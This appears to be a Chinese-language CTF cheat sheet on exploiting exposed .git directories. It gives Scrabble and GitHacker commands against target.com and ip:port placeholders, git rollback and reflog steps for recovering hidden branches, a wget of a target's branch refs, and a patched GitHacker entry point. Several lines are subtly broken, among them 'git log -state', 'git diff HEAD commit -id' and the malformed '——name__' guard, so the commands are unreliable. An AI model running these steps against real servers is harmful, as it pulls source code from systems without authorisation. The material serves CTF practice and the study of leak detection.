#### Git泄露

> 开发过程中遗忘.git文件，错误地提交到服务器，导致通过此文件获取往期源码

1. 常规利用

   利用Scrabble工具直接获得源码：[工具地址](https://github.com/denny0223/scrabble)

   ```shell
   ./scrabble http://target.com/
   ```

2. Git回滚获取源码

   1. Git覆盖

      ```shell
      echo “new content” > doc.php
      ```

      ```shell
      git add doc.php
      ```

      ```shell
      git commit -m "[version_name]"
      ```

   2. Git回滚

      > 其中，HEAD表示当前版本，而HEAD^表示上一版本

      ```shell
      git reset --hard HEAD^
      ```

      1. 查看每个Commit修改了哪些文件

         ```shell
         git log -state
         ```

      2. 比较在当前版本与想查看的Commit之间的变化

         ```shell
         git diff HEAD commit -id
         ```

   3. 隐藏的Git分支

      > Flag可能并不在master的分支中，尝试还原其他分支的代码

      利用GitHacker查看Git提交记录，分支移动记录：[工具地址](https://github.com/WangYihang/GitHacker)

      ```shell
      python GitHacker.py [http://ip:port/.git/]
      ```

      进入本地生成的文件夹，执行，查询得到master分支信息

      ```shell
      git log --all
      ```

      ```shell
      git branch -v
      ```

      查看checkout记录，获知提交记录，分支移动信息

      ```shell
      git reflog
      ```

      下载所需分支的Head信息，保存在本地同名同目录下

      ```shell
      wget http://ip:port/.git/refs/heads/[target_branch]
      ```

      修改GitHacker.py，使用fixmissing函数，检测Head下分支缺失的文件并恢复

      ```python
      if ——name__ == "__main__":
          # main()
          base_url = complete_url("http://ip:port/.git/")
          temp_path = replace_bad_char(get_prefix(base_url))
          fixmissing(base_url, temp_path)
      ```